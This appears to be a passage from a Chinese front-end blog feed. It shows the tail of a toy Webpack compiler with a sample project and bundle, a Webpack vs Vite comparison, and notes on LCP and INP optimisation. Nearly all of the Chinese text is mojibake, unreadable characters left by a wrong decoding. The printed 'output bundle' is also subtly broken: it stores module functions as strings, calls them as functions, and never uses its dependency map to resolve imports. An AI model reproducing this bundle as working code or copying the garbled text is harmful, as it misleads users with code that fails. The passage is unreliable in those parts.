<br>    <span class="hljs-comment">// å†™å…¥æ–‡ä»¶</span><br>    fs.<span class="hljs-title function_">writeFileSync</span>(outputPath, bundleCode);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å·²ç”Ÿæˆbundleæ–‡ä»¶: <span class="hljs-subst">$&#123;outputPath&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 8. ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> webpackConfig = &#123;<br>  <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;./src/index.js&#x27;</span>,<br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;dist&#x27;</span>),<br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;bundle.js&#x27;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// åˆ›å»ºCompilerå®ä¾‹å¹¶è¿è¡Œ</span><br><span class="hljs-keyword">const</span> compiler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Compiler</span>(webpackConfig);<br>compiler.<span class="hljs-title function_">run</span>();<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒæµç¨‹è¯¦è§£</strong></p><ul><li>åˆå§‹åŒ–é˜¶æ®µ<ul><li>åˆ›å»ºCompilerå®ä¾‹ï¼Œæ¥æ”¶é…ç½®å‚æ•°</li><li>å‡†å¤‡modulesã€chunkså’Œassetsç­‰æ•°æ®ç»“æ„</li></ul></li><li>ç¼–è¯‘é˜¶æ®µ<ul><li>å…¥å£è§£æï¼šä»é…ç½®çš„entryå¼€å§‹è§£æ</li><li>æ¨¡å—æ„å»ºï¼š<ul><li>è¯»å–æ–‡ä»¶å†…å®¹</li><li>ä½¿ç”¨Babelè§£æä¸ºAST</li><li>éå†ASTæ”¶é›†ä¾èµ–</li><li>ä½¿ç”¨Babelè½¬æ¢ä»£ç </li></ul></li><li>æ„å»ºä¾èµ–å›¾ï¼šé€’å½’è§£ææ‰€æœ‰ä¾èµ–æ¨¡å—</li></ul></li><li>ç”Ÿæˆé˜¶æ®µ<ul><li>ç”ŸæˆChunksï¼šæ ¹æ®å…¥å£å’Œä¾èµ–å…³ç³»ç”Ÿæˆä»£ç å—</li><li>åˆ›å»ºæ¨¡å—æ˜ å°„ï¼šä¸ºæ¯ä¸ªæ¨¡å—åˆ›å»ºIDå’Œä¾èµ–æ˜ å°„</li><li>ç”Ÿæˆè¿è¡Œæ—¶ä»£ç ï¼šå®ç°requireå‡½æ•°å’Œæ¨¡å—ç¼“å­˜</li></ul></li><li>è¾“å‡ºé˜¶æ®µ<ul><li>ç”Ÿæˆbundleä»£ç ï¼šå°†æ‰€æœ‰æ¨¡å—æ‰“åŒ…åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­</li><li>å†™å…¥æ–‡ä»¶ç³»ç»Ÿï¼šè¾“å‡ºåˆ°é…ç½®çš„outputç›®å½•</li></ul></li></ul><p><strong>ä½¿ç”¨ç¤ºä¾‹</strong></p><p>åˆ›å»ºä¸€ä¸ªç®€å•çš„é¡¹ç›®ç»“æ„æµ‹è¯•æˆ‘ä»¬çš„Webpackå®ç°ï¼š</p><p>é¡¹ç›®ç»“æ„ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Text">my-project/<br>  â”œâ”€â”€ src/<br>  â”‚   â”œâ”€â”€ index.js<br>  â”‚   â”œâ”€â”€ message.js<br>  â”‚   â””â”€â”€ name.js<br>  â”œâ”€â”€ dist/<br>  â”œâ”€â”€ my-webpack.js (ä¸Šé¢çš„ä»£ç )<br>  â””â”€â”€ package.json<br></code></pre></td></tr></table></figure><p>src&#x2F;index.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; message &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./message.js&#x27;</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);<br></code></pre></td></tr></table></figure><p>src&#x2F;message.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; name &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./name.js&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> message = <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>;<br></code></pre></td></tr></table></figure><p>src&#x2F;name.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> name = <span class="hljs-string">&#x27;Webpack Developer&#x27;</span>;<br></code></pre></td></tr></table></figure><p>è¿è¡Œæˆ‘ä»¬çš„Webpackå®ç°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">node my-webpack.js<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ (dist&#x2F;bundle.js):</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">(<span class="hljs-keyword">function</span>(<span class="hljs-params">modules</span>) &#123;<br>  <span class="hljs-comment">// ç¼“å­˜å·²åŠ è½½çš„æ¨¡å—</span><br>  <span class="hljs-keyword">var</span> installedModules = &#123;&#125;;<br>  <br>  <span class="hljs-comment">// å®ç°requireå‡½æ•°</span><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">require</span>(<span class="hljs-params">moduleId</span>) &#123;<br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²ç¼“å­˜</span><br>    <span class="hljs-keyword">if</span> (installedModules[moduleId]) &#123;<br>      <span class="hljs-keyword">return</span> installedModules[moduleId].<span class="hljs-property">exports</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// åˆ›å»ºæ–°æ¨¡å—</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = installedModules[moduleId] = &#123;<br>      <span class="hljs-attr">exports</span>: &#123;&#125;<br>    &#125;;<br>    <br>    <span class="hljs-comment">// æ‰§è¡Œæ¨¡å—å‡½æ•°</span><br>    modules[moduleId].<span class="hljs-property">fn</span>.<span class="hljs-title function_">call</span>(<br>      <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>, <br>      <span class="hljs-variable language_">module</span>, <br>      <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>, <br>      <span class="hljs-built_in">require</span><br>    );<br>    <br>    <span class="hljs-comment">// è¿”å›æ¨¡å—å¯¼å‡º</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>;<br>  &#125;<br>  <br>  <span class="hljs-comment">// åŠ è½½å…¥å£æ¨¡å—</span><br>  <span class="hljs-built_in">require</span>(<span class="hljs-number">0</span>);<br>&#125;)(&#123;<br>  <span class="hljs-string">&quot;0&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;fn&quot;</span>: <span class="hljs-string">&quot;\&quot;use strict\&quot;;\n\nvar _message = require(\&quot;./message.js\&quot;);\n\nconsole.log(_message.message);&quot;</span>,<br>    <span class="hljs-string">&quot;deps&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;./message.js&quot;</span>: <span class="hljs-number">1</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&quot;1&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;fn&quot;</span>: <span class="hljs-string">&quot;\&quot;use strict\&quot;;\n\nObject.defineProperty(exports, \&quot;__esModule\&quot;, &#123;\n  value: true\n&#125;);\nexports.message = void 0;\n\nvar _name = require(\&quot;./name.js\&quot;);\n\nvar message = \&quot;Hello, \&quot;.concat(_name.name, \&quot;!\&quot;);\nexports.message = message;&quot;</span>,<br>    <span class="hljs-string">&quot;deps&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;./name.js&quot;</span>: <span class="hljs-number">2</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&quot;2&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;fn&quot;</span>: <span class="hljs-string">&quot;\&quot;use strict\&quot;;\n\nObject.defineProperty(exports, \&quot;__esModule\&quot;, &#123;\n  value: true\n&#125;);\nexports.name = void 0;\nvar name = &#x27;Webpack Developer&#x27;;\nexports.name = name;&quot;</span>,<br>    <span class="hljs-string">&quot;deps&quot;</span>: &#123;&#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="8-3-2-å¯¹æ¯”Webpackä¸Viteçš„Bundlelessè®¾è®¡å·®å¼‚"><a href="#8-3-2-å¯¹æ¯”Webpackä¸Viteçš„Bundlelessè®¾è®¡å·®å¼‚" class="headerlink" title="8.3.2 å¯¹æ¯”Webpackä¸Viteçš„Bundlelessè®¾è®¡å·®å¼‚"></a>8.3.2 å¯¹æ¯”Webpackä¸Viteçš„Bundlelessè®¾è®¡å·®å¼‚</h3><p><strong>æ ¸å¿ƒæ¶æ„å·®å¼‚å…¨æ™¯</strong></p><pre class="mermaid">graph LR  W[Webpack] -->|åŸºäºBundle| A[å¼€å‘/ç”Ÿäº§ç»Ÿä¸€æ‰“åŒ…]  V[Vite] -->|Bundleless| B[å¼€å‘ï¼šESMæŒ‰éœ€åŠ è½½<br>ç”Ÿäº§ï¼šRollupæ‰“åŒ…]    subgraph å¼€å‘æ¨¡å¼    A --> C[å¯åŠ¨æ—¶å…¨é‡æ‰“åŒ…]    B --> D[å¯åŠ¨æ—¶æ— æ‰“åŒ…]  end    subgraph ç”Ÿäº§æ¨¡å¼    A --> E[Webpackæ‰“åŒ…]    B --> F[Rollupæ‰“åŒ…]  end</pre><p><strong>äº”å¤§æ ¸å¿ƒç»´åº¦å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Webpack</th><th align="left">Vite</th><th align="left">æœ¬è´¨å·®å¼‚</th></tr></thead><tbody><tr><td align="left">å¼€å‘å¯åŠ¨</td><td align="left">å…¨é‡æ‰“åŒ…åå¯åŠ¨ï¼ˆO(n)ï¼‰</td><td align="left">ä»…å¯åŠ¨Serverï¼ˆO(1)ï¼‰</td><td align="left">é¡¹ç›®è¶Šå¤§å·®å¼‚è¶Šæ˜¾è‘—</td></tr><tr><td align="left">HMRæ›´æ–°</td><td align="left">é‡æ–°æ„å»ºå—å½±å“Chunk</td><td align="left">è¾¹ç•Œæ¨¡å—æŒ‰éœ€æ›´æ–°ï¼ˆæ¯«ç§’çº§ï¼‰</td><td align="left">ä¾èµ–å›¾éå† vs ESMåŠ¨æ€åŠ è½½</td></tr><tr><td align="left">ç”Ÿæ€å…¼å®¹</td><td align="left">â­â­â­â­â­ æ”¯æŒæ‰€æœ‰Loader&#x2F;Plugin</td><td align="left">â­â­â­ ä¾èµ–Rollupæ’ä»¶ä½“ç³»</td><td align="left">å†å²åŒ…è¢± vs è½»é‡è®¾è®¡</td></tr><tr><td align="left">æ„å»ºè¾“å‡º</td><td align="left">è‡ªå®šä¹‰Chunkåˆ†å‰²</td><td align="left">åŸç”ŸESMè¾“å‡º + å¼‚æ­¥Chunk</td><td align="left">äººå·¥ä¼˜åŒ– vs åŸç”Ÿå¹¶è¡ŒåŠ è½½</td></tr><tr><td align="left">è°ƒè¯•æ”¯æŒ</td><td align="left">SourceMapæ˜ å°„æ‰“åŒ…åä»£ç </td><td align="left">ç›´æ¥æ˜ å°„æºç ï¼ˆæœªç¼–è¯‘çŠ¶æ€ï¼‰</td><td align="left">è½¬æ¢åè°ƒè¯• vs æºç çº§è°ƒè¯•</td></tr></tbody></table><p><strong>å¼€å‘æ¨¡å¼åŸç†å‰–æ</strong></p><p>(1) Webpack ä¼ ç»Ÿæ‰“åŒ…æµç¨‹</p><pre class="mermaid">sequenceDiagram  æµè§ˆå™¨->>DevServer: è¯·æ±‚å…¥å£HTML  DevServer->>Webpack: è§¦å‘å…¨é‡æ‰“åŒ…  Webpack->>æµè§ˆå™¨: è¿”å›bundle.js(åŒ…å«æ‰€æœ‰æ¨¡å—)  æµè§ˆå™¨->>DevServer: HMRæ›´æ–°è¯·æ±‚  Webpack->>Webpack: é‡æ–°æ„å»ºå—å½±å“Chunk  Webpack->>æµè§ˆå™¨: å‘é€æ›´æ–°è¡¥ä¸</pre><p>(2) Vite Bundleless æµç¨‹</p><pre class="mermaid">sequenceDiagram  æµè§ˆå™¨->>ViteServer: è¯·æ±‚å…¥å£HTML  ViteServer->>æµè§ˆå™¨: è¿”å›åŸºç¡€HTML  æµè§ˆå™¨->>ViteServer: è¯·æ±‚main.js(ESM)  ViteServer->>æµè§ˆå™¨: è¿”å›åŸç”ŸESMæ¨¡å—  æµè§ˆå™¨->>ViteServer: æŒ‰éœ€è¯·æ±‚ä¾èµ–æ¨¡å—  æµè§ˆå™¨->>ViteServer: HMRè¾¹ç•Œæ¨¡å—æ›´æ–°  ViteServer->>æµè§ˆå™¨: ä»…æ›´æ–°å•ä¸ªæ¨¡å—</pre><p>å…³é”®åˆ›æ–°ï¼š</p><ul><li>åˆ©ç”¨æµè§ˆå™¨åŸç”Ÿ ESM èƒ½åŠ›</li><li>ä¾èµ–é¢„æ„å»ºï¼ˆesbuild è½¬æ¢ CJS æ¨¡å—ï¼‰</li><li>åŸºäºè·¯ç”±çš„ä»£ç åˆ†å‰²ï¼ˆè‡ªç„¶ä»£ç åˆ†å‰²ï¼‰</li></ul><hr>]]></content>
    
    
    <categories>
      
      <category>Webpack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Webpack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‰ç«¯æ€§èƒ½ä¼˜åŒ–çŸ¥è¯†ä¸“é¢˜å­¦ä¹ </title>
    <link href="/2025/06/29/Performance%20Optimization/"/>
    <url>/2025/06/29/Performance%20Optimization/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€æ€§èƒ½æŒ‡æ ‡ä½“ç³»ä¸ç›‘æ§"><a href="#ä¸€ã€æ€§èƒ½æŒ‡æ ‡ä½“ç³»ä¸ç›‘æ§" class="headerlink" title="ä¸€ã€æ€§èƒ½æŒ‡æ ‡ä½“ç³»ä¸ç›‘æ§"></a>ä¸€ã€æ€§èƒ½æŒ‡æ ‡ä½“ç³»ä¸ç›‘æ§</h1><h2 id="1-1-æ ¸å¿ƒæ€§èƒ½æŒ‡æ ‡-Web-Vitals"><a href="#1-1-æ ¸å¿ƒæ€§èƒ½æŒ‡æ ‡-Web-Vitals" class="headerlink" title="1.1 æ ¸å¿ƒæ€§èƒ½æŒ‡æ ‡ (Web Vitals)"></a>1.1 æ ¸å¿ƒæ€§èƒ½æŒ‡æ ‡ (Web Vitals)</h2><h3 id="LCP-æœ€å¤§å†…å®¹æ¸²æŸ“æ—¶é—´"><a href="#LCP-æœ€å¤§å†…å®¹æ¸²æŸ“æ—¶é—´" class="headerlink" title="LCP (æœ€å¤§å†…å®¹æ¸²æŸ“æ—¶é—´)"></a>LCP (æœ€å¤§å†…å®¹æ¸²æŸ“æ—¶é—´)</h3><p><strong>LCP æ ¸å¿ƒå®šä¹‰</strong></p><ul><li>å®˜æ–¹æ ‡å‡†ï¼š<ul><li>æµ‹é‡ è§†å£å†…æœ€å¤§æ–‡æœ¬&#x2F;å›¾ç‰‡å…ƒç´  ä»é¡µé¢å¼€å§‹åŠ è½½åˆ°å…¶æ¸²æŸ“å®Œæˆçš„æ—¶é—´</li><li>åæ˜ ç”¨æˆ·æ„ŸçŸ¥çš„ä¸»è¦å†…å®¹å¯è§æ€§é€Ÿåº¦</li></ul></li><li>æ€§èƒ½é˜ˆå€¼ï¼ˆChromeå®˜æ–¹ï¼‰:<ul><li>Goodï¼ˆä¼˜ï¼‰ï¼šâ‰¤ 2.5 ç§’</li><li>Needs Improvementï¼ˆéœ€ä¼˜åŒ–ï¼‰ï¼š2.6 - 4.0 ç§’</li><li>Poorï¼ˆå·®ï¼‰ï¼š&gt; 4.0 ç§’</li></ul></li></ul><span id="more"></span><p><strong>LCP è®¡ç®—è§„åˆ™</strong></p><ul><li>å€™é€‰å…ƒç´ ç±»å‹ï¼ˆæŒ‰ä¼˜å…ˆçº§ï¼‰:<ul><li><code>&lt;img&gt;</code> æ ‡ç­¾ï¼ˆå«srcæˆ–srcsetï¼‰</li><li><code>&lt;image&gt;</code> åœ¨ SVG ä¸­çš„å…ƒç´ </li><li><code>&lt;video&gt;</code> çš„å°é¢å›¾ï¼ˆposterå±æ€§ï¼‰</li><li>é€šè¿‡ url() åŠ è½½èƒŒæ™¯å›¾çš„å—çº§å…ƒç´ </li><li>åŒ…å«æ–‡æœ¬èŠ‚ç‚¹çš„å—çº§å…ƒç´ ï¼ˆå¦‚<code>&lt;p&gt;ã€&lt;h1&gt;</code>ï¼‰</li></ul></li><li>åˆ¤å®šé€»è¾‘:<ul><li>å– è§†å£å†…å¯è§åŒºåŸŸ é¢ç§¯æœ€å¤§çš„å…ƒç´ </li><li>è‹¥å…ƒç´ åœ¨æ¸²æŸ“åè¢«ç§»é™¤&#x2F;å°ºå¯¸å˜åŒ–ï¼Œå–æœ€ç»ˆç¨³å®šçŠ¶æ€</li></ul></li></ul><p><strong>å½±å“ LCP çš„å…³é”®å› ç´ </strong></p><table><thead><tr><th align="left">å› ç´ </th><th align="left">å…·ä½“åŸå› </th><th align="left">å…¸å‹åœºæ™¯ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">èµ„æºåŠ è½½å»¶è¿Ÿ</td><td align="left">å…³é”®å›¾ç‰‡&#x2F;å­—ä½“æœªä¼˜å…ˆåŠ è½½</td><td align="left">æœªå¯¹é¦–å±å›¾ç‰‡æ·»åŠ  preload</td></tr><tr><td align="left">æœåŠ¡ç«¯å“åº”æ…¢</td><td align="left">TTFBï¼ˆé¦–å­—èŠ‚æ—¶é—´ï¼‰è¿‡é«˜</td><td align="left">æœªå¯ç”¨ CDN&#x2F;æ•°æ®åº“æŸ¥è¯¢æ…¢</td></tr><tr><td align="left">æ¸²æŸ“é˜»å¡</td><td align="left">CSS&#x2F;JS æ–‡ä»¶é˜»å¡ä¸»çº¿ç¨‹</td><td align="left">æœªæ‹†åˆ†å…³é”® CSS&#x2F;æœªå¼‚æ­¥åŠ è½½ JS</td></tr><tr><td align="left">å¸ƒå±€åç§»å¹²æ‰°</td><td align="left">åŠ¨æ€æ’å…¥å†…å®¹å¯¼è‡´æœ€å¤§å…ƒç´ å˜åŒ–</td><td align="left">å¹¿å‘Šä½å¼‚æ­¥åŠ è½½</td></tr></tbody></table><p><strong>LCP ä¼˜åŒ–æ‰‹æ®µ</strong></p><p>(1) èµ„æºä¼˜å…ˆçº§æå‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- é¢„åŠ è½½ LCP å›¾ç‰‡ --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;hero-image.webp&quot; as=&quot;image&quot;&gt;<br></code></pre></td></tr></table></figure><p>(2) æœåŠ¡ç«¯åŠ é€Ÿ</p><ul><li>é‡‡ç”¨ HTTP&#x2F;2 + TLS1.3</li><li>è¾¹ç¼˜ç¼“å­˜ï¼ˆCDN é™æ€èµ„æºï¼‰</li></ul><p>(3) æ¸²æŸ“å…³é”®è·¯å¾„ä¼˜åŒ–</p><ul><li>å†…è”å…³é”® CSSï¼ˆCritical CSSï¼‰</li><li>å»¶è¿Ÿéå…³é”® JSï¼ˆasync&#x2F;deferï¼‰</li></ul><p>(4) åª’ä½“èµ„æºé’ˆå¯¹æ€§å¤„ç†</p><ul><li>ä½¿ç”¨ <code>&lt;img loading=&quot;eager&quot;&gt;</code> è¦†ç›–é»˜è®¤æ‡’åŠ è½½</li><li>å“åº”å¼å›¾ç‰‡é€‚é…ï¼šsrcset + sizes</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;img srcset=&quot;small.jpg 480w, medium.jpg 768w, large.jpg 1200w&quot;<br>     sizes=&quot;(max-width: 600px) 480px, 100vw&quot;<br>     src=&quot;fallback.jpg&quot; alt=&quot;Hero Image&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>LCP æµ‹é‡å·¥å…·</strong></p><ul><li>Chrome DevTools â†’ Performance é¢æ¿ï¼ˆæŸ¥çœ‹ Timings ä¸­çš„ LCP æ ‡è®°ï¼‰</li></ul><p><strong>å¸¸è§è¯¯åŒº</strong></p><ul><li>é”™è¯¯è®¤çŸ¥<ul><li>âŒ LCP åªå…³æ³¨å›¾ç‰‡ â†’ âœ… åŒ…å«æ–‡æœ¬&#x2F;è§†é¢‘å°é¢ç­‰ä»»ä½•æœ€å¤§å…ƒç´ </li><li>âŒ èƒŒæ™¯å›¾ä¸€å®šè®¡å…¥ â†’ âœ… ä»…å½“å…ƒç´ ä¸ºå—çº§ä¸”å°ºå¯¸æ˜ç¡®æ—¶æœ‰æ•ˆ</li></ul></li><li>å®è·µé™·é˜±<ul><li>ä½¿ç”¨éª¨æ¶å±ï¼ˆSkeleton Screenï¼‰å¯èƒ½å»¶é•¿ LCPï¼ˆéª¨æ¶å±æœ¬èº«å¯èƒ½è¢«è®¡ä¸ºæœ€å¤§å…ƒç´ ï¼‰</li><li>åŠ¨æ€æ’å…¥çš„å¹¿å‘Š&#x2F;Banner è‹¥æˆä¸ºæœ€å¤§å…ƒç´ ï¼Œå…¶åŠ è½½æ—¶é—´å°†ä¸»å¯¼ LCP</li></ul></li></ul><h3 id="FID-é¦–æ¬¡è¾“å…¥å»¶è¿Ÿ-â†’-INP-Interaction-to-Next-Paint"><a href="#FID-é¦–æ¬¡è¾“å…¥å»¶è¿Ÿ-â†’-INP-Interaction-to-Next-Paint" class="headerlink" title="FID (é¦–æ¬¡è¾“å…¥å»¶è¿Ÿ) â†’ INP (Interaction to Next Paint)"></a>FID (é¦–æ¬¡è¾“å…¥å»¶è¿Ÿ) â†’ INP (Interaction to Next Paint)</h3><p><strong>FIDï¼ˆé¦–æ¬¡è¾“å…¥å»¶è¿Ÿï¼‰æ ¸å¿ƒæ¦‚å¿µ</strong></p><p>å®šä¹‰ï¼š</p><ul><li>æµ‹é‡ç”¨æˆ·é¦–æ¬¡äº¤äº’ï¼ˆç‚¹å‡»&#x2F;è§¦æ‘¸&#x2F;æŒ‰é”®ï¼‰åˆ°æµè§ˆå™¨å®é™…å“åº”çš„æ—¶é—´å·®</li><li>é‡åŒ–é¡µé¢å¯äº¤äº’æ€§çš„æ ¸å¿ƒæŒ‡æ ‡ï¼ˆåæ˜ ä¸»çº¿ç¨‹é˜»å¡ç¨‹åº¦ï¼‰</li></ul><p>æ€§èƒ½é˜ˆå€¼ï¼š</p><ul><li>Goodï¼ˆä¼˜ï¼‰ï¼šâ‰¤ 100ms</li><li>Needs Improvementï¼ˆéœ€ä¼˜åŒ–ï¼‰ï¼š101 - 300ms</li><li>Poorï¼ˆå·®ï¼‰ï¼š&gt; 300ms</li></ul><p>å…³é”®å±€é™ï¼š</p><ul><li>ä»…æµ‹é‡é¦–æ¬¡äº¤äº’å»¶è¿Ÿ</li><li>æ— æ³•æ•è·é¡µé¢ç”Ÿå‘½å‘¨æœŸä¸­çš„æŒç»­äº¤äº’ä½“éªŒ</li></ul><p><strong>INPï¼ˆä¸‹æ¬¡ç»˜åˆ¶äº¤äº’ï¼‰å–ä»£ FID çš„åŸå› </strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">FID (æ—§æ ‡å‡†)</th><th align="left">INP (æ–°æ ‡å‡†)</th></tr></thead><tbody><tr><td align="left">æµ‹é‡èŒƒå›´</td><td align="left">ä»…é¦–æ¬¡äº¤äº’</td><td align="left">æ‰€æœ‰å…³é”®äº¤äº’ï¼ˆæ»šåŠ¨&#x2F;ç‚¹å‡»&#x2F;è¾“å…¥ï¼‰</td></tr><tr><td align="left">æ—¶é—´è¦†ç›–</td><td align="left">é¡µé¢åŠ è½½åˆæœŸ</td><td align="left">æ•´ä¸ªé¡µé¢ç”Ÿå‘½å‘¨æœŸ</td></tr><tr><td align="left">ä»£è¡¨æ€§</td><td align="left">éƒ¨åˆ†åœºæ™¯å¤±çœŸ</td><td align="left">æ›´å…¨é¢åæ˜ çœŸå®ç”¨æˆ·ä½“éªŒ</td></tr><tr><td align="left">å®˜æ–¹çŠ¶æ€</td><td align="left">2023å¹´èµ·é€æ­¥æ·˜æ±°</td><td align="left">Chromeå®˜æ–¹æ¨èæŒ‡æ ‡ï¼ˆ2024å¹´æˆä¸ºCore Web Vitalï¼‰</td></tr></tbody></table><p><strong>INP æ ¸å¿ƒæœºåˆ¶</strong></p><p>(1) æµ‹é‡åŸç†</p><pre class="mermaid">graph LRA[ç”¨æˆ·äº¤äº’] --> B{äº‹ä»¶è§¦å‘}B --> C[è¾“å…¥å»¶è¿Ÿ]C --> D[å¤„ç†æ—¶é—´]D --> E[å‘ˆç°å»¶è¿Ÿ]E --> F[ä¸‹æ¬¡ç”»é¢æ›´æ–°]</pre><ul><li>æ€»è€—æ—¶ &#x3D; è¾“å…¥å»¶è¿Ÿ + äº‹ä»¶å¤„ç†æ—¶é—´ + å‘ˆç°å»¶è¿Ÿ</li></ul><p>(2) æ€§èƒ½é˜ˆå€¼</p><ul><li>Goodï¼ˆä¼˜ï¼‰ï¼šâ‰¤ 200ms</li><li>Needs Improvementï¼ˆéœ€ä¼˜åŒ–ï¼‰ï¼š201 - 500ms</li><li>Poorï¼ˆå·®ï¼‰ï¼š&gt; 500ms</li></ul><p>(3) å…³é”®äº¤äº’å®šä¹‰</p><ul><li>å–æ‰€æœ‰äº¤äº’äº‹ä»¶ä¸­æœ€æ…¢çš„ç¬¬98ç™¾åˆ†ä½å€¼ï¼ˆæ’é™¤é•¿å°¾å¼‚å¸¸å€¼ï¼‰</li></ul><p><strong>å½±å“ INP çš„å…³é”®å› ç´ </strong></p><ul><li>é•¿ä»»åŠ¡ï¼ˆLong Tasksï¼‰<ul><li>ä¸»çº¿ç¨‹é˜»å¡ &gt; 50ms çš„ JS ä»»åŠ¡</li><li>å…¸å‹åœºæ™¯ï¼šæœªä¼˜åŒ–çš„ç¬¬ä¸‰æ–¹è„šæœ¬</li></ul></li><li>æ¸²æŸ“æ•ˆç‡ä½ä¸‹<ul><li>å¤æ‚æ ·å¼è®¡ç®— &#x2F; å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout Thrashingï¼‰</li><li>è¿‡åº¦é‡ç»˜ï¼ˆRepaintï¼‰</li></ul></li><li>å†…å­˜å‹åŠ›<ul><li>é¢‘ç¹ GCï¼ˆåƒåœ¾å›æ”¶ï¼‰å¯¼è‡´æš‚åœ</li><li>å†…å­˜æ³„æ¼ç§¯ç´¯</li></ul></li></ul><p><strong>INP ä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) ä»»åŠ¡æ‹†åˆ†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å°†é•¿ä»»åŠ¡æ‹†åˆ†ä¸º &lt;50ms çš„ç‰‡æ®µ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processChunk</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (tasks.<span class="hljs-property">length</span>) &#123;<br>    <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-keyword">while</span> (tasks.<span class="hljs-property">length</span> &amp;&amp; performance.<span class="hljs-title function_">now</span>() - start &lt; <span class="hljs-number">50</span>) &#123;<br>      <span class="hljs-title function_">executeTask</span>(tasks.<span class="hljs-title function_">shift</span>());<br>    